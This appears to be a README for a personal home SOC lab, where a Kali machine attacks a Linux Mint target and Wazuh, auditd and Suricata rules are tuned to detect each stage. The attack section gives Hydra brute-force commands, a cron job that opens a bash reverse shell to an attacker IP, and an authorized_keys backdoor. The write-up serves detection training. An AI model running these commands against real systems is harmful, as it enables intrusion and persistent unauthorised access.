# 🛡️ Home SOC Lab — Attack Simulation & Detection

> A hands-on Security Operations Centre lab built to simulate real-world attack chains and validate detection capability across network and host layers.

---

## 📌 Overview

This lab was designed to go beyond passive learning — I built, broke, and debugged every component myself. The goal was to simulate a multi-stage intrusion, write and tune custom detection rules, and validate that alerts fire correctly end-to-end. Every detection in this write-up was confirmed by reading raw logs, identifying why rules weren't triggering, and resolving them.

**Focus areas:** Threat detection · Log analysis · IDS tuning · SIEM correlation · MITRE ATT&CK mapping

---

## 🖧 Lab Topology

```
┌─────────────────────────────────────────────────────────┐
│                   Android Mobile Hotspot                │
│                  (Network Gateway / DHCP)               │
└──────────────────────┬──────────────────────────────────┘
                       │
          ┌────────────┴─────────────┐
          │                          │
┌─────────▼──────────┐    ┌──────────▼──────────┐
│   Laptop 1         │    │   Laptop 2           │
│   (Attacker)       │    │   (Defender)         │
│                    │    │                      │
│  ┌──────────────┐  │    │  ┌───────────────┐   │
│  │  Kali Linux  │  │    │  │  Linux Mint   │   │
│  │  (Attacker   │  │    │  │  (Target VM + │   │
│  │   VM)        │  │    │  │   Wazuh Agent │   │
│  └──────────────┘  │    │  │   + auditd    │   │
│                    │    │  │   + Suricata) │   │
│                    │    │  └───────────────┘   │
│                    │    │                      │
│                    │    │  ┌───────────────┐   │
│                    │    │  │   pfSense     │   │
│                    │    │  │   (Firewall / │   │
│                    │    │  │    Router VM) │   │
│                    │    │  └───────────────┘   │
│                    │    │                      │
│                    │    │  ┌───────────────┐   │
│                    │    │  │  Wazuh Server │   │
│                    │    │  │   (SIEM/XDR)  │   │
│                    │    │  └───────────────┘   │
└────────────────────┘    └──────────────────────┘
```

**Traffic flow:** Kali → Mobile Hotspot → pfSense → Linux Mint target  
**Monitoring:** Wazuh agent on Linux Mint ships logs to Wazuh Server · Suricata inspects network traffic inline

---

## 🧰 Tools & Stack

| Layer | Tool | Role |
|---|---|---|
| SIEM / XDR | Wazuh | Log ingestion, correlation, alerting, FIM |
| IDS | Suricata | Network-level threat detection |
| Host Auditing | auditd | Syscall-level activity logging |
| Firewall / Router | pfSense | Network segmentation, traffic control |
| Attacker OS | Kali Linux | Offensive tooling (Hydra, Nmap, ssh-keygen) |
| Target OS | Linux Mint | Victim endpoint with full monitoring stack |
| Brute Force Tool | Hydra | SSH credential brute force simulation |
| Persistence Mechanism | cron + authorized_keys | Simulated post-exploitation persistence |

---

## ⚔️ Attack Simulation — Kill Chain

The full attack was executed from Kali Linux against the Linux Mint target, progressing through four stages mapped to MITRE ATT&CK.

### Stage 1 — Reconnaissance
**Tool:** Nmap  
**Action:** Port scan to identify open services on the target  

```bash
nmap -sV -p 22 10.xx.xx.135
```

| ATT&CK ID | Tactic | Description |
|---|---|---|
| T1046 | Discovery — Network Service Scanning | Scanning target host to identify exposed SSH service |

---

### Stage 2 — SSH Brute Force (Initial Access)
**Tool:** Hydra  
**Action:** Dictionary attack against SSH using a wordlist  

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://10.xx.xx.135
```

| ATT&CK ID | Tactic | Description |
|---|---|---|
| T1110.001 | Credential Access — Brute Force: Password Guessing | Systematically attempting passwords to gain SSH access |
| T1021.004 | Lateral Movement — Remote Services: SSH | Using valid credentials obtained via brute force to authenticate over SSH |

---

### Stage 3 — Persistence via Cron Job
**Action:** Scheduled a recurring task to re-establish attacker presence  

```bash
(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/10.xx.xx.124/4444 0>&1") | crontab -
```

| ATT&CK ID | Tactic | Description |
|---|---|---|
| T1053.003 | Persistence — Scheduled Task/Job: Cron | Abusing cron to execute malicious commands at regular intervals |

---

### Stage 4 — Backdoor via authorized_keys
**Action:** Injected attacker's public key into the target's `authorized_keys` file for passwordless re-entry  

```bash
echo "<attacker-public-key>" >> ~/.ssh/authorized_keys
```

| ATT&CK ID | Tactic | Description |
|---|---|---|
| T1098.004 | Persistence — Account Manipulation: SSH Authorized Keys | Modifying authorized_keys to allow persistent key-based SSH access without credentials |

---

## 🔍 Detection Rules & Alerts

All detections below required writing or modifying custom rules. Each was debugged by reading individual log pipelines — `auditd` logs, Suricata fast.log, and Wazuh `ossec.log` — to trace why rules weren't firing and resolve them.

**BASE LOGS**
logs/1.base-logs.png

---

### Detection 1 — SSH Brute Force (Wazuh)

**Trigger:** Repeated failed SSH authentication attempts from a single source IP  
**Rule source:** Custom Wazuh rule tuned on `sshd` log pattern  
**Log source:** `/var/log/auth.log` via Wazuh agent  

```xml
<rule id="100001" level="10" frequency="8" timeframe="60">
  <if_matched_sid>5760</if_matched_sid>
  <description>SSH brute force attempt detected</description>
  <mitre>
    <id>T1110.001</id>
  </mitre>
</rule>
```

**Alert fired:** ✅ Wazuh Dashboard — Level 10 alert with source IP and attempt count

---

### Detection 2 — Cron Persistence (Wazuh + auditd)

**Trigger:** Write to crontab by a non-root, non-scheduled process  
**Rule source:** auditd watch rule on crontab path, correlated in Wazuh  
**Log source:** auditd → `/var/log/audit/audit.log`  

```bash
# auditd watch rule
-w /var/spool/cron/crontabs -p wa -k persistence_cron
```

**Alert fired:** ✅ Wazuh detected `persistence_cron` key event with user, PID, and command context

---

### Detection 3 — Suricata Network Alert (SSH Brute Force)

**Trigger:** High-frequency SSH connection attempts to port 22  
**Rule source:** Custom Suricata rule  

```
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; \
  flow:to_server; threshold:type threshold, track by_src, count 10, seconds 60; \
  sid:1000001; rev:1;)
```

**Alert fired:** ✅ `/var/log/suricata/fast.log` — repeated hits from Kali source IP

> **Debug note:** Suricata was silently failing due to a missing `tmpfs` socket directory. Identified by checking `suricata --list-runmodes` output and `/var/run/suricata/` path, then resolved by creating the directory and adjusting the systemd unit.

---

### Detection 4 — FIM Alert on authorized_keys (Wazuh syscheck)

**Trigger:** Modification to `~/.ssh/authorized_keys`  
**Rule source:** Wazuh FIM (syscheck) with custom monitored path  

```xml
<directories realtime="yes" check_all="yes" report_changes="yes">
  /home/<user>/.ssh
</directories>
```

**Alert fired:** ✅ Wazuh FIM alert — flagged file modification with diff of added key content

---

## 💡 Key Takeaways

**Detection engineering is iterative.** Every rule in this lab was written, tested, found to be silent, debugged, and fixed. The gap between "rule exists" and "alert fires" is where real SOC skill is built.

**Log pipeline literacy matters.** Tracing a silent Suricata alert back to a missing runtime directory, or correlating an auditd key event with a Wazuh rule — this requires understanding each tool's data flow, not just its dashboard.

**Layered visibility catches what single tools miss.** The brute force was caught at both the host level (Wazuh/auth.log) and the network level (Suricata). Persistence was caught through FIM *and* auditd — two independent signals for the same technique.

**MITRE ATT&CK as a design framework.** Mapping each attack stage before executing it forced deliberate thinking about what artifacts each technique leaves — and whether the detection stack was positioned to see them.

---

## 📁 Repository Structure

```
soc-home-lab/
├── README.md                  ← This file
├── topology/
│   └── network-diagram.png
├── rules/
│   ├── wazuh-custom-rules.xml
│   ├── suricata-custom.rules
│   └── auditd-rules.conf
├── logs/
│   └── sample-alerts/         ← Redacted alert screenshots
└── attack-scripts/
    └── simulation-notes.md
```

---

## 👤 Author

**Riyajath Hameed P.**  
B.Sc Computer Science graduate | Aspiring SOC Analyst  
[LinkedIn](https://linkedin.com/riyajath/) · [GitHub](https://github.com/Riyajath)

---

